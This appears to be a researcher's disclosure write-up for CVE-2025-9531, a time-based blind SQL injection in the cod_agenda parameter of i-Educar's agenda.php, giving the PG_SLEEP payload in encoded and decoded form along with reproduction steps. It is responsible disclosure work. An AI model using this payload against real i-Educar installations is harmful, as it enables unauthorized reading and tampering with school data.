## CVE-2025-9531

### Introduction

<p align="justify">While diving into the <b><a href="https://github.com/portabilis/i-educar" target=_blank>i-Educar</a></b> Open-Source project, I uncovered a critical time-based blind SQL Injection vulnerability in the <b>cod_agenda</b> parameter of the <b>agenda.php</b> endpoint. </br> This flaw allows attackers to execute arbitrary SQL queries silently against the backend database, putting data confidentiality, integrity, and availability at risk. </br> After validating the issue using a payload that caused measurable delays in the server's response, I reported it responsibly, and it was officially assigned as <b><a href="https://www.cve.org/CVERecord?id=CVE-2025-9531" target=_blank>CVE-2025-9531</a></b>. </p>

### What is CVE-2025-9531?

<p align="justify"><b><a href="https://www.cve.org/CVERecord?id=CVE-2025-9531" target=_blank>CVE-2025-9531</a></b> is a SQL Injection vulnerability in the <b>/intranet/agenda.php</b> endpoint of the <b><a href="https://github.com/portabilis/i-educar" target=_blank>i-Educar</a></b> application. </br> The vulnerable parameter is <b>cod_agenda</b>, which lacks proper input validation. </br> This makes it possible to inject custom SQL queries, including <code>PG_SLEEP()</code> functions that introduce time delays, confirming the flaw via time-based behavior. </p>

### Technical Details

‚û§ **Vulnerable Endpoint** `/intranet/agenda.php`

‚û§ **Affected Parameter:** `cod_agenda`

> ‚û§ **Payload Used (Encoded)**
> ```sql
>%27%20AND%204698=(SELECT%204698%20FROM%20PG_SLEEP(5))%20AND%20%27xiCO%27=%27xiCO
>```

> ‚û§ **Payload Used (Decoded)**
> ```sql
>' AND 4698=(SELECT 4698 FROM PG_SLEEP(5)) AND 'xiCO'='xiCO
>```

### Proof of Concept (PoC)

To reproduce the vulnerability:

‚û§ Access the vulnerable endpoint and click **"Novo Compromisso"** (New Appointment)

‚û§ Fill in the required fields and click **"Salvar"** (Save)

‚û§ The system redirects to a URL like:

```URL
http://localhost:8086/intranet/agenda.php?cod_agenda=2&time=1755283
```
<br>
‚û§ Now, modify the `cod_agenda` parameter with the payload:

```URL
/intranet/agenda.php?cod_agenda=2' AND 4698=(SELECT 4698 FROM PG_SLEEP(5)) AND 'xiCO'='xiCO
```
> <p align="justify">The server will take 5 seconds to respond, confirming that the SQL query was executed successfully.</p>

{{< /admonition >}}

### Impact

This vulnerability can be exploited to:

- Access sensitive data stored in the database;
- Enumerate database schemas, tables, and columns;
- Modify, delete, or insert arbitrary records;
- Steal user credentials and personal information;
- Perform a denial of service (DoS) attack by triggering long query delays;
- In some cases, escalate to Remote Code Execution (RCE).

### Official Sources

The flaw was ethically reported and attributed as:

### Conclusion

<p align="justify">SQL injection attacks remain one of the most critical threats to web applications, especially when silent and time-based. This discovery demonstrates how a single unvalidated parameter can compromise the entire database behind a platform. </br></br> If you're a developer or security analyst, be aware: <b>even small, seemingly harmless endpoints can hide dangerous flaws.</b></p>
